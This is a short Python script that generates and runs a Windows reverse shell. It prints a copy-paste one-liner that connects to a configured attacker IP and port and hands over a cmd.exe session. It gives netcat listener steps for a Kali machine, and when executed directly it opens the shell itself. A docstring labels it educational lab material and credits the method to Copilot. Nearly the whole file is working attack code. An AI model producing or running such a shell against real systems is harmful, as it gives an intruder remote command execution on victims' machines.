#!/usr/bin/env python3
"""
One-liner Windows Reverse Shell
Educational purposes only - Use in controlled lab environment
This is the one-liner method mentioned by Copilot
"""

# Import configuration
import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
import config

# One-liner reverse shell - execute this in Windows victim
one_liner = f"""python -c "import socket,os,subprocess,sys; s=socket.socket(); s.connect(('{config.ATTACKER_IP}',{config.ATTACKER_PORT})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['cmd.exe'])" """

print("=" * 80)
print("WINDOWS ONE-LINER REVERSE SHELL")
print("=" * 80)
print()
print("Copy and paste this command in the Windows victim machine:")
print()
print(one_liner)
print()
print("=" * 80)
print("INSTRUCTIONS:")
print("1. Start listener on Kali: sudo nc -lvnp", config.ATTACKER_PORT)
print("2. Execute the above command on Windows victim")
print("3. You'll get an interactive cmd.exe shell where 'cd' works!")
print("=" * 80)

# Also execute it directly if run as script
if __name__ == "__main__":
    import socket, subprocess
    
    try:
        s = socket.socket()
        s.connect((config.ATTACKER_IP, config.ATTACKER_PORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1) 
        os.dup2(s.fileno(), 2)
        subprocess.call(['cmd.exe'])
    except Exception as e:
        print(f"Error: {e}")